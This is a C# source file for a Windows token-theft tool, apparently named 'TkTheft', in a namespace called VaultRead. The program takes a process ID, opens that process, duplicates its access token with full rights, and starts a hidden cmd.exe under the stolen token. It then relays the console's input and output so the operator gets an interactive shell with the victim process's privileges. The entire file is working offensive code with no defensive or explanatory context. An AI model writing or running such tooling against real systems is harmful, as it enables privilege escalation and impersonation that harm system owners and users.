using ModFinal;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace VaultRead
{
    internal class Program
    {

        private static IntPtr o_read;
        private static IntPtr o_write;
        private static IntPtr i_read;
        private static IntPtr i_write;
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("[!] .\\TkTheft.exe <PID>");
                Environment.Exit(-1);
            }
            int t = int.Parse(args[0]);

            Console.WriteLine("[+] PID --> {0}", t);

            IntPtr hProc = Win32.OpenProcess((uint)(0x00000400 | 0x00000040), false, t);
            Console.WriteLine("[+] Target Process hProc --> 0x{0:x}", hProc);

            IntPtr hTkImp;
            Win32.OpenProcessToken(hProc, (0x0002 | 0x0004), out hTkImp);
            Console.WriteLine("[+] Target Process Tk --> 0x{0:x}", hTkImp.ToInt64());

            IntPtr dup = IntPtr.Zero;
            Win32.DuplicateTokenEx(hTkImp, 0x01ff, IntPtr.Zero, 2, 1, out dup);
            Console.WriteLine("[+] Target Process Tk.Dup --> 0x{0:x}", dup.ToInt64());

            Win32.SECURITY_ATTRIBUTES saAttr = new Win32.SECURITY_ATTRIBUTES();
            saAttr.nLength = Marshal.SizeOf(typeof(Win32.SECURITY_ATTRIBUTES));
            saAttr.bInheritHandle = 0x1;
            saAttr.lpSecurityDescriptor = IntPtr.Zero;

            Win32.CreatePipe(ref o_read, ref o_write, ref saAttr, 0);
            Win32.CreatePipe(ref i_read, ref i_write, ref saAttr, 0);

            Win32.SetHandleInformation(o_read, 0x00000001, 0);
            Win32.SetHandleInformation(i_read, 0x00000001, 0);

            Win32.STARTUPINFO si = new Win32.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.hStdOutput = o_write;
            si.hStdError = o_write;
            si.hStdInput = i_read;
            si.dwFlags |= 0x00000100;

            Win32.CreateProcessWithTokenW(dup, 0x00000001, "C:\\Windows\\System32\\cmd.exe", $"/k whoami", 0x08000000,
                IntPtr.Zero, null, ref si, out _);


            Thread readThread = new Thread(() => ReadOut(o_read));
            Thread writeThread = new Thread(() => WriteIn(i_write));

            writeThread.Start();
            readThread.Start();

        }
        static void ReadOut(IntPtr stdOutHandle)
        {
            while (true)
            {
                byte[] buffer = new byte[4096];
                int bytesRead = 0;

                if (Win32.ReadFile(stdOutHandle, buffer, buffer.Length, ref bytesRead, IntPtr.Zero))
                {

                    if (bytesRead > 0)
                    {

                        string output = Encoding.Default.GetString(buffer, 0, (int)bytesRead);
                        Console.Write(output);
                        Console.Out.Flush();
                    }
                    else
                    {
                        Console.WriteLine("[+] No more data left to be read.");
                        break;
                    }
                }

                else
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine($"[!] Error reading from StdOut: {error}");
                    break;
                }

            }

        }

        static void WriteIn(IntPtr stdInHandle)
        {


            while (true)
            {
                string input = Console.ReadLine();

                byte[] buffer = Encoding.Default.GetBytes(input + Environment.NewLine);
                int bytesWritten = 0;
                if (!Win32.WriteFile(stdInHandle, buffer, buffer.Length, ref bytesWritten, IntPtr.Zero))
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine($"[!] Error writing to StdIn: {error}");
                    break;
                }
            }
        }
    }

}

